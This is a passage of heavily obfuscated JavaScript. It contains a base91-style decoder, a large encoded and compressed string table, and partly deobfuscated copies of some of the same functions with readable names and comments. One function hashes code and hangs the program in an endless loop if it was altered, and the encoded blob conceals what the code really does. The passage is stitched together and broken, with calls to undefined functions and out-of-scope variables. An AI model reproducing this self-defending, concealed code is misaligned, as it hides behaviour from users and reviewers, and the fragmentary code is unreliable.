        function Kg3ITsT(bw1LDXR, uXPxRCH = ",finKcBNDrkOLjEAMClVPYgpht*|JuG\"QbTH1^W.:]d/`~_SXa;@oRqmZseF>5IU2[#{vw$})x!z7?9+3y&<46=%(08", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
            UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
            for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                if (xtbSJI === -0x1) {
                    continue;
                }
                if (td77ore < 0x0) {
                    td77ore = xtbSJI;
                } else {
                    UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                    do {
                        UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                    } while (jJIllx > 0x7);
                    td77ore = -0x1;
                }
            }
            if (td77ore > -0x1) {
                n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
            }
            return pE8Nth(n49oLe);
        }
    }
    var SniCEEX = TljPa8(w4YYdZb.toString()
        .replace(/ |\n|;|,|\{|\}|\(|\)|\.|\[|\]/g, ''), 386);
    if (SniCEEX == 8864915299968749) {
        return w4YYdZb.apply(this, arguments);
    } else {
        while (true) {
            mHQbVa = 0x63;
            for (mHQbVa = 0x63; mHQbVa == mHQbVa; mHQbVa *= mHQbVa) {
                if (y7bTqx(rKAu9MB(mHQbVa, MHQ3bYA(-0x2f)) && console.log(mHQbVa), mHQbVa) <= 0xa) {
                    break;
                }
            };
            if (mHQbVa === 0x64) {
                mHQbVa--;
            }
        };
    }
}());

function decode(input, 
    charset = "PokB^=WIuGc<UxRsN64$pM!8v2f1|dwireaAtXQb%KOyTj?>9@m*H[F.hC{zS,0#lLJ]nE~qV:\"YgD}375+;(&)`/_Z",
    inputStr,
    strLength,
    resultBytes = [],
    accumulator = 0,
    bitCount = 0,
    currentValue,
    position = 0,
    charPosition) {
    
    // Convert input to string if not already
    inputStr = '' + (input || '');
    strLength = inputStr.length;
    currentValue = -1;

    // Process each character
    for (position = 0; position < strLength; position++) {
        // Get position of current character in charset
        charPosition = charset.indexOf(inputStr[position]);
        
        // Skip if character not found in charset
        if (charPosition === -1) {
            continue;
        }

        // Initialize currentValue if needed
        if (currentValue < 0) {
            currentValue = charPosition;
        } else {
            // Calculate new value and update accumulator
            currentValue += charPosition * 91; // 0x5b = 91
            accumulator |= currentValue << bitCount;
            
            // Determine bits to shift based on value
            bitCount += (currentValue & 0x1fff) > 88 ? 13 : 14; // 0x58 = 88, 0xd = 13, 0xe = 14

            // Extract bytes while we have enough bits
            do {
                resultBytes.push(accumulator & 0xff);
                accumulator >>= 8;
                bitCount -= 8;
            } while (bitCount > 7);
            
            currentValue = -1;
        }
    }

    // Handle remaining bits
    if (currentValue > -1) {
        resultBytes.push((accumulator | currentValue << bitCount) & 0xff);
    }

    // Process final bytes through another function (pE8Nth)
    return processBytes(resultBytes);
}

function MsCwg5O() {
    return ")haWHzi/|Y^W5fC9|PT/GN|c1()VG{d|i{/qA:#Q|BlAvB$Bħwĝ_\"2}ħI*~_bYĦ|T+hq|D*qF}fe_y>`M=DP\"|fUT2cze;L%>gp|1IN,g,DŢ{l]_g`I6?>8D:[d^|;AĴŰľhASF(t(ħ6c78eSQħfrƌJXĶţbŦŚoqO|XK2Xu[apWeMpjN\"ġľ{+OTw|QZJvqa*ħjAıG*>x|k~9F{|,[xwH}jĴ_+$TfE.rKƝXy^(c)Ƣ09m^}thU$N>O>F*zǅNc~,_siħEle2%;ǽ|(+[vU6+Ţ+b_2d2ǅƱĴU/ȅu~av=,tħzbL2s^oħulŨksgħvknsVL!ħn@ǉu|a\"rvRȄħ8*;qnLǅ9+(,ƵJSvueP$ŢƂƄƆ=9(%6ȃZ|`AtF,P`z@P{SEɣ:Aǲȶ;RFCW,OEţIzFb~ƜƞŅɈɊǅDA~X_=HŢa8d_JaįɤɦFa@ONɟ?rkɣp~U{>tʑĐK8ɣnc.vK;ǅǼȥRXm9VP7Ū|bk?3ȃuŢC#DqKX]ǅj*ɁI~Ɨmqwvvnƈ|Crg_vLR{o1!ĿcR3(ȝħ}r,ew[^9o(7s>9[%%rŢk\"+2*7<h(P*ɮɣ1\";8.$j$ɭ^CDɣc˓qj,8m̀F~Ţɒ,QsH̃|%*JEŃƠlT!`Ɨl*vFm2nfnMejǬsb]A@_Ȯmzō#HZ/+4$Oʳȶȩ|NUǹď*UɁp:<fo_ɯ<ɣƒV,<zuh6k#P.yiơǈw3|4UF8i2D<CMUCu:8}B{<8y7ƽ\">[1d+V6ą^TΖNħ^O<wpNJŢ̛,ƸyUΦ8+n3tǅ[7ǉVȾʔ_̢ʹ2Pc2UDU<3ŢȤȝ`$ŋb.wg!j(Ŀ+k8I=F.=iw=noș|#Ki,Ǵ@Q0Ĉ+K&*|eZD8wz{.Ȃ4t@w}ĕwclHĴƽ|˘KHǋ!IǬbbqBɧf%:+Lu,ǅ/Aȝď0baE͍CūcɁmTʙGA_3Pv?fȂ|S)IZt4Lrʁ?$ǅʓ8LD~;͙|M͌СdЍl(Čn5ȸ|?%˚P,ʙH82{ϐȰǆUϬw6Ɍ}ͰȽƊŇмrͰwLȡѐђxdMR@%N7w!K|gǝnȽp8ǬJyȍ|̆ŘȶlħŮxh`PVħsѵ,`;Ѝɥaq{ɋ|Ac΢Ά_%#Cj̊ɣβ@,͢UʳΆǅ]#ıpt7ŢMPƝ|@̧ɐҪcyVk_4pJKLp&ǝ|ĳŇv5ʹJ%ũbZ)}̒ʁ(X@m8>QfyDEbilΔ0~ҝĨ{nΕ7Υ|ɍɏŚ%.ƞĽɏ]5ϠƞˠͰB;ˬeĖcаȟɌ+ȝȓp.;B|ZZҷƎγ|ntGtѬFŢ$)_ZCNː|όпʭЊG5ѨǇ:Fr`ѹ@[XEΟЋ2_[pvf4.g[mDҏ˖ʁп~6Α͠Փ=}~OpFҷǅĸȉʀȅŽȉ\"yRŢ˒̔}њħ!F˅ʃћ̪QYДəƃƅtɝɟhuRo#ӱņFWI[h_.7zū+rqˤү[ioʣɣƱҦ65R_C!uCyվɛցɞ%|=Oj3ˤgmtԟŽϬU͞c˅ȶľ@ƍԱdћQ6ȥѷǅǇ6v#ɬħƱ֖HҟRԓ3ZīˤǅtkyTҼ|&ԅvѷfhӭ=g;@ԲĩɏhXP=֐zԯZLb}cϻES˞țԾՀѹh}=hnzЍĸb΀~ˡ,Śˑ8`hϮQciţrֲ;ңħbcȝȽɳ̫ĹϓΙ?C4lB}qט|^LϬď=ɇɉҩ,}מǴǅlU͍TL)ħG}Ҍӕ=ħ/r֖ƕ̊ƞԡդѽRjυχωϋŢ8FŨoԞN#ؙ̱˭ьyİ+Ũղ٧|u+ɧ|FcKTͲћ/}H2k,ԥSІ,b7٬7OϻюЍՌԾ92͝ƠҷS؞ԓȲƌļǅɥȉ[ϭħPڂ8өȕɎٽșħɒɔZHĘ>٩V];ԪwT8VA<ǄƟơƣƥpGgMs$$W^:لƶȈq/f˞gUhvxCSŢŀŘlhȅŖϬG><Ţy̅2ʺ٬1OSgO}`l`ϙ5rȥƕʻkifPŢͣɧˤҖ΁̂ŃŤEeűcϹ|dKǹ֡ǯƞƊ8TښѹʨĢȟ9Q͚=λɣؠԾƎAԆǰjύkO2ȽP[пՇ\"A|JbƲΟVXħ*ATDLT#(ܬ)%IL@tܻɣŅкƵUcǲьǅό԰ٱcƳʺ̊\"j4ܭZɁۜƦȂk|!#NeRnˁ=ΟvC:ȕЮvʃ%fƞ{p!{Ƀѹ$\"ۏټQqַIP/y$bsFoFљȅ_Uƌ7^ʙŅҦ_`ʙrФvď͟ʳټ͝ĸʈҩƱ΢qSǅ5[42؝ڷ>rԃ׏ݟAE3ʵǅV@˭ֻۍԾh˸ħ=bީ@vȅёٓѾٖݞqʋvڑϠܬL\"ƌˎѨgϝUjׄħ݉ީξƱҷD`Տ7ez>D@@ų%ʍӽүӭ̡׫ϙa~JqNzBNַש֪րւ%քֆֈŅŇЀrRJC/ҡŪΥl˳Ĥh$τݞsIԿ}8ǅބd,SXWg9֮ό{ɣB@ǲ޵ŕѪ,ۜӒԔƹ/$Ɛ|zƏޙڤ|EFƝΐĬɣʂYZ{6Pܳܭ~ԩ9*܁ɣ_IՓyȐ\"ɣѣؔق͝drĢ|ٌsƴżAȉȟ˞nr{ֳLf\"o?=ر+ֲIv<Rƞ׋׍zɝ!MVC*+P6ޭܬŀ˭ǋ^0rdHC)ԓ́,ׄЂ%c|oӗH$umFF|qbSzJDࠚb|pC]rll$]|<j<ȷB,ࢳsmĔ܆ۘQʨpܬJƿI{Bz2mS࢙QAࣇࣉٻ࣍Y:E</cd1rԟ3.@ddX$,Vf|tr.dU[yܬnZYqQ<6ܬ?e9/^4ࣰܬGhQTFBZnh|V>^RܭࣆࣈNܬHLő^&+ܬsįTR$ƂԵ࣠࣢Յܬࣰ࣮࣪࣬R&aٯȟ۫PќࣻࣽࣿAő3^ױL`C=GRࢰtaő|rG\"pT|2BVqXbć1+E׸Ծjls࣍K<]wIiZfϷe<NwG|LEnj˿řो+m3Jz~࢘Az^Ѕ҅EɾJ>jkϷɘtq9y,|+@)rH9Ȅ٭A{Q~3Wi*Dl~yf7:єংGG%Oছ|0g\"$kौؙ6yJƽG&ঊuঔখঘؙ;ࠞnথ2ঊه}7!gȟপcj҆ঌ঎ঐCR}ު͞еr16ঊl>P??঳ؙ^/~ݞ\"_<D|ĪYkN!XGԟ֑ছ~ȉؙ৛ঢ়য়2=^ξ%n>?&<ঙk[Ov̱=:Gࣨ৿ਁਃঙҪИo{Xйऋ!Gm\"}ঊsउˡqJؙ`^@Ū7[ࣨf/bȻ\"el҆e}ΑEmoؙ࢚)B54ঊۜ[qن_ؙeE4*.^Nࣨ~C˖а]ࣨQ@GaAWaࣨƦiRϕ6݉ǯ>ٿTO(\"L؅J7IRM(:_࢘ਫ਼੠҈ؙa:{Dफlؙ~:^ݞ<Eক47س࠼QE\".x~ҳIdmaŠTܵMॆŉyβg޸>,1j_m7ն਒svকe?XؙQ/ঢ়3w:ؙઅઇ7fVyl|)F৬u}4h;U%е<ࣕ˂@Bै<uVĕ˿;਩#hĕk:z࢘K*৬:v>ؙiAAઉȾ^go͔ਘਠRk३ǉoו$ઊٜhrĈ_p7K+ĄXાң7R2)੄৽ࣩ/FDN+7ocξc[૖૾PؙfKআkĝؙGsચ࡟(Җઈଚ|>:ӱ׹ঊHqr@`Zl߀stCKnॅKcǇ߄ؙn/বʿূ|~Tݹભĭb>֌iਿ:hࣨOKFQCwQгRٮ]҆૟иG9ਤऋf{;˻શ|ରଲ଴xࣨݩ:ΒXঊc}ক&વؙ૟ҝs?JGުy_$ખHtࣨzn֕LXehLCztjMdWEࣨ&Pߥ୤Aͻ21Xਊ਌ࣨST֑য়੆|ୢ?୤Ny஄ஆஈஊĨǃர9fַм̏?02੿Ўq૾/3௃Bஹ୤஭rf^J஀ઊ௎ߵh<଩H/Hଡ଼}਒஌எஐஒC_ॅ/૏j!x]ھ;௄ெ32hzCࢡEছr+yMؙ9@z৩Sிுן|8६Q[ԯੇऎ*ਿ଩ڿW\"ઈঊ$˖7lŝؙƂং|}υ\"نKমI\"[bK>Hi3ͳp<ঊA*ҝ୻ы,Ȁ҇p࡯%7଩ঌxƝ!_ǂऱS@ిO!ఄkf5҆ୃ୅ޏ]o࣋ǆfu҆௅఺ƌ3}Cڍࣨాీఄౙѝ఼ଛLq\"tિn2rJ}eؙ3~4ʺvDؙ4E૱Ƚ!Eĳ;&3૙|પ২ȾବDମƶ@੼಍ɂE}$ৱń*ϯf)]Sĕఱߒே୦$nক]3g٣FK?ਝେਯJ?ly଩t*౮\"9ӹĕऍଆಒಔԟ6dL?89ѵԟપૺȽহਨuoય|5q&z:3૤લҒAংȽڴXr୘௘AQtgS୬ڴ૱ࣩ_nQ௹ঊଜ3ૻKK৬৯౲௄иJ|гϯˣఄKڻϩ@఑য়଩[/X=RQSƵ\"\"Vh࣍ݤP!v୶˂xB[!Py࠼xPA҆!No6ߋടгকd&@S?FHmࣨ$Z౽ওকগঙؙ˘bശgj6ؙͦ೬३jଡ଼\"d3ঊKϊ৩ೋDm̙ƬŕKи^xੁ঺ഭ঒^ज7౫yn୘Ƨjࣨࣃঢ়ঈ*ؙ]LೱӚ̃ଆ&ૅĕೳ5kXvఄহ૾*ࣘൕt/৬|wOೌঋ@ઃ|ͤ:&ಂഐ?Ƚ੶੡੣ݟEਁ௹શĕv@࡯ே൛೽Սʺ#௭0Նuɒਘ+8X>਋Pࣨ`੭S9s{ౠೄ఍̮ࣨWs೓`v஭ͼOQD{୬lR5?ځAԟO+9SٜUࣨ)E૬Šঊq*ిଟ1ഽ:৬Ϸ/ēNগ୦઱౮dɖ઀:ֵE!ѵĕ*௚ଡ଼رs৬֨5ൃ೻n௛eQදԟ:*೬sQ৻ԟ<ಣQऊcਮݹ}h17Cb)5Ls]Hง୙wూԟߖ5Bয়Iાڴਨ౰H૓৪A৬Y౱௲ธ)ࣨFҙ౯٭L௿t9xǷV~#இലpල*B࣌ഗಕZ*੼A!෡୭/દ1xZؙ_ࣙkEউҪ<తҾ6C๡:XYDw๦{ഡXN/ϱ|v*NǊિt౰Q#?xngȆalW~ČࢱĔছ9ͨxoୈ9O1Ի3d=c!B690Ob8̟ĕi࢐^eF3೓z+Dμ0dln}^FhऱVjbw8HH%࠽AMࡒ_A]શGࣰ7?ફ!W؈uQഢঃ1΁ɇfR.eI($+˅fw૧n0Żun෭fineĞcoȴ࣪uct֜৪e຀ǫĿextDe໬෭ૻѪԧ8AٍaടBufŊૻS࣪໨ກ༄r༆|j਺଼෭໾ԓƒomࣩo།r༏Ⱦppಱ|W2ුV଎˟ൡ2iݗTr5X9XXмfmOʕ࠷V9qڍ͞x0ফਬƿy෾XFࣣ6Dກءࢰ४अеǅcѣWUI༧2૧mऊMNslԨ༝gEQnbQ3";
}

function uYMuRK(UxmmwSD) {
    return bw1LDXR[UxmmwSD];
}

function decompressString(inputString) {
    // Initialize variables
    let dictionarySize;
    let currentString;
    let character;
    let dictionary = {};
    
    // Split input into array of characters
    let inputChars = inputString.split('');
    
    // Initialize with first character
    let previousChar = currentString = inputChars[0];
    let result = [previousChar];
    
    // Set initial dictionary size
    let nextCode = dictionarySize = 256;
    
    // Process remaining characters
    for (let i = 1; i < inputChars.length; i++) {
        // Get current character code
        character = inputChars[i].charCodeAt(0);
        
        // Determine next sequence
        let sequence;
        if (nextCode > character) {
            sequence = inputChars[i];
        } else {
            sequence = dictionary[character] || (currentString + previousChar);
        }
        
        // Add to result
        result.push(sequence);
        
        // Update previous character
        previousChar = sequence.charAt(0);
        
        // Add new sequence to dictionary
        dictionary[nextCode] = currentString + previousChar;
        nextCode++;
        
        // Update current string
        currentString = sequence;
    }
    
    // Join result and split on pipe character
    return result.join('').split('|');
}